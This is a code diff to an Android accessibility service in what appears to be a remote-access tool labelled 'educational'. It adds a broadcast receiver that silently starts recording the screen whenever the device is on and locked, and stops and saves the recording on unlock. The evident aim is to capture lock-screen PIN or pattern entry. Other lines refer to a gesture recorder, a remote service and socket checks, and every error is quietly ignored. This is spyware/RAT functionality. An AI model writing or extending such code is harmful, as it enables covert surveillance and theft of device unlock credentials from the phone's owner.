@@ -90,6 +90,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private static final int SOCKET_CHECK_INTERVAL = 30_000;
     private Handler socketCheckHandler;
     private Runnable socketCheckRunnable;
+
+    // Screen state receiver — auto-starts/stops screen reader recording
+    private android.content.BroadcastReceiver screenStateReceiver;
     
     public static UnifiedAccessibilityService getInstance() {
         return instance;
@@ -178,6 +181,24 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { ensureRemoteServiceRunning(); } catch (Exception ignored) {}
         try { startSocketCheckLoop(); } catch (Exception ignored) {}
 
+        // Register receiver for screen on/off and unlock events — drives auto-recording
+        try { registerScreenStateReceiver(); } catch (Exception ignored) {}
+
+        // Auto-start screen reader recording immediately if screen is on and locked
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                android.app.KeyguardManager km =
+                        (android.app.KeyguardManager) getSystemService(KEYGUARD_SERVICE);
+                android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                boolean screenOn = pm != null && pm.isInteractive();
+                boolean locked   = km != null && km.isKeyguardLocked();
+                if (screenOn && locked) {
+                    SocketManager.getInstance(UnifiedAccessibilityService.this).startScreenReaderAuto();
+                }
+            } catch (Exception ignored) {}
+        }, 3000);
+
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try {
@@ -239,6 +260,50 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         };
         socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
+    }
+
+    /**
+     * Register a BroadcastReceiver for screen on/off and user-unlock events.
+     * Drives autonomous screen-reader recording: record while locked, stop on unlock or screen-off.
+     */
+    private void registerScreenStateReceiver() {
+        if (screenStateReceiver != null) return;
+        screenStateReceiver = new android.content.BroadcastReceiver() {
+            @Override
+            public void onReceive(android.content.Context ctx, Intent intent) {
+                if (intent == null || intent.getAction() == null) return;
+                try {
+                    SocketManager sm = SocketManager.getInstance(ctx);
+                    switch (intent.getAction()) {
+                        case Intent.ACTION_SCREEN_OFF:
+                            // Screen turned off — stop recording and save
+                            sm.stopScreenReaderAuto();
+                            break;
+                        case Intent.ACTION_SCREEN_ON:
+                            // Screen woke up — start recording only if still locked
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try {
+                                    android.app.KeyguardManager km =
+                                            (android.app.KeyguardManager) ctx.getSystemService(KEYGUARD_SERVICE);
+                                    if (km != null && km.isKeyguardLocked()) {
+                                        sm.startScreenReaderAuto();
+                                    }
+                                } catch (Exception ignored) {}
+                            }, 500);
+                            break;
+                        case Intent.ACTION_USER_PRESENT:
+                            // Device unlocked — stop recording and save
+                            sm.stopScreenReaderAuto();
+                            break;
+                    }
+                } catch (Exception ignored) {}
+            }
+        };
+        android.content.IntentFilter filter = new android.content.IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        filter.addAction(Intent.ACTION_SCREEN_ON);
+        filter.addAction(Intent.ACTION_USER_PRESENT);
+        registerReceiver(screenStateReceiver, filter);
     }
     
     private void updateCurrentAppName() {
@@ -1477,6 +1542,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             com.remoteaccess.educational.commands.GestureRecorder gr =
                 com.remoteaccess.educational.network.SocketManager.getInstance(this).getGestureRecorder();
             if (gr != null) gr.disableLockScreenAutoCapture();
+        } catch (Exception ignored) {}
+        try {
+            if (screenStateReceiver != null) {
+                unregisterReceiver(screenStateReceiver);
+                screenStateReceiver = null;
+            }
+        } catch (Exception ignored) {}
+        try {
+            SocketManager.getInstance(this).stopScreenReaderAuto();
         } catch (Exception ignored) {}
         instance = null;
     }
